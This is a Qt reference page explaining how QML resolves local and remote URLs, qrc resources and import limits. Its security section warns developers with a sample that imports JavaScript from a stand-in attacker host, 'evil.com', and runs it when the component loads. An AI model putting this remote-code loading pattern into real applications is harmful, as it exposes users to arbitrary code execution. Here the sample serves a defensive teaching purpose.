---
Title: QtQml.qtqml-documents-networktransparency
---

# QtQml.qtqml-documents-networktransparency

<span class="subtitle"></span>
<!-- $$$qtqml-documents-networktransparency.html-description -->
<p>QML supports network transparency by using URLs (rather than file names) for all references from a QML document to other content. This means that anywhere a URL source is expected, QML can handle remote resources as well as local ones, for example in the following image source:</p>
<pre class="qml"><span class="type">Image</span> {
<span class="name">source</span>: <span class="string">&quot;http://www.example.com/images/logo.png&quot;</span>
}</pre>
<p>Since a <i>relative</i> URL is the same as a relative file, development of QML on regular file systems remains simple:</p>
<pre class="qml"><span class="type">Image</span> {
<span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
}</pre>
<p>Network transparency is supported throughout QML, for example:</p>
<ul>
<li>Fonts - the <code>source</code> property of FontLoader is a URL</li>
<li>WebViews - the <code>url</code> property of WebView (obviously!)</li>
</ul>
<p>Even QML types themselves can be on the network - if the Prototyping with qmlscene is used to load <code>http://example.com/mystuff/Hello.qml</code> and that content refers to a type &quot;World&quot;, the engine will load <code>http://example.com/mystuff/qmldir</code> and resolve the type just as it would for a local file. For example if the qmldir file contains the line &quot;World World.qml&quot;, it will load <code>http://example.com/mystuff/World.qml</code> Any other resources that <code>Hello.qml</code> referred to, usually by a relative URL, would similarly be loaded from the network.</p>
<h2 id="relative-vs-absolute-urls">Relative vs. Absolute URLs</h2>
<p>Whenever an object has a property of type URL (QUrl), assigning a string to that property will actually assign an absolute URL - by resolving the string against the URL of the document where the string is used.</p>
<p>For example, consider this content in <code>http://example.com/mystuff/test.qml</code>:</p>
<pre class="qml"><span class="type">Image</span> {
<span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
}</pre>
<p>The Image source property will be assigned <code>http://example.com/mystuff/images/logo.png</code>, but while the QML is being developed, in say <code>C:\User\Fred\Documents\MyStuff\test.qml</code>, it will be assigned <code>C:\User\Fred\Documents\MyStuff\images\logo.png</code>.</p>
<p>If the string assigned to a URL is already an absolute URL, then &quot;resolving&quot; does not change it and the URL is assigned directly.</p>
<h2 id="qrc-resources">QRC Resources</h2>
<p>One of the URL schemes built into Qt is the &quot;qrc&quot; scheme. This allows content to be compiled into the executable using The Qt Resource System. Using this, an executable can reference QML content that is compiled into the executable:</p>
<pre class="cpp">    <span class="type">QQuickView</span> <span class="operator">*</span>view <span class="operator">=</span> <span class="keyword">new</span> <span class="type">QQuickView</span>;
view<span class="operator">-</span><span class="operator">&gt;</span>setUrl(<span class="type">QUrl</span>(<span class="string">&quot;qrc:/dial.qml&quot;</span>));</pre>
<p>The content itself can then use relative URLs, and so be transparently unaware that the content is compiled into the executable.</p>
<h2 id="limitations">Limitations</h2>
<p>The <code>import</code> statement is only network transparent if it has an &quot;as&quot; clause.</p>
<p>More specifically:</p>
<ul>
<li><code>import &quot;dir&quot;</code> only works on local file systems</li>
<li><code>import libraryUri</code> only works on local file systems</li>
<li><code>import &quot;dir&quot; as D</code> works network transparently</li>
<li><code>import libraryUrl as U</code> works network transparently</li>
</ul>
<h2 id="implications-for-application-security">Implications for Application Security</h2>
<p>The QML security model is that QML content is a chain of trusted content: the user installs QML content that they trust in the same way as they install native Qt applications, or programs written with runtimes such as Python and Perl. That trust is establish by any of a number of mechanisms, including the availability of package signing on some platforms.</p>
<p>In order to preserve the trust of users, QML application developers should not load and execute arbitrary JavaScript or QML resources. For example, consider the QML code below:</p>
<pre class="qml">import QtQuick 2.0
import &quot;http://evil.com/evil.js&quot; as Evil
<span class="type"><a href="QtQml.Component.md">Component</a></span> {
<span class="name">onLoaded</span>: <span class="name">Evil</span>.<span class="name">doEvil</span>()
}</pre>
<p>This is equivalent to downloading and executing &quot;http://evil.com/evil.exe&quot;. <b>The QML engine will not prevent particular resources from being loaded</b>. Unlike JavaScript code that is run within a web browser, a QML application can load remote or local filesystem resources in the same way as any other native applications, so application developers must be careful in loading and executing any content.</p>
<p>As with any application accessing other content beyond its control, a QML application should perform appropriate checks on any untrusted data it loads. <b>Do not, for example, use <code>import</code>, Loader or <a href="QtQml.qtqml-javascript-qmlglobalobject.md#xmlhttprequest">XMLHttpRequest</a> to load any untrusted code or content.</b></p>
<!-- @@@qtqml-documents-networktransparency.html -->
